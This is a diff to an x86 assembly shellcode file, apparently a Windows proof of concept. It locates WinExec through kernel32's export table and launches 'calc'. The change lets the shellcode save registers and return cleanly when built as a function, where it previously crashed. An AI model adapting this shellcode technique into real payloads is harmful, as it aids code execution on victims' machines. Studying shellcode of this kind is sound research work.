@@ -10,11 +10,15 @@ SECTION .text
 
 %include 'type-conversion.asm'
 
+; WinExec *requires* 4 byte stack alignment
 %ifndef PLATFORM_INDEPENDENT
 global _shellcode                         ; _ is needed because LINKER will add it automatically.
 _shellcode:
 %ifdef STACK_ALIGN
     AND     SP, 0xFFFC
+%endif
+%ifdef FUNC
+    PUSHAD
 %endif
 %endif
 
@@ -58,4 +62,11 @@ find_winexec_x86:
     ADD     EDI, [ESI + EBP * 4]          ; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)
 
     CALL    EDI                           ; WinExec(&("calc"), 0);
-    INT3                                  ; Crash
+%ifndef PLATFORM_INDEPENDENT
+%ifdef FUNC
+    POP     EAX
+    POP     EAX
+    POPAD
+    RET                                   
+%endif
+%endif
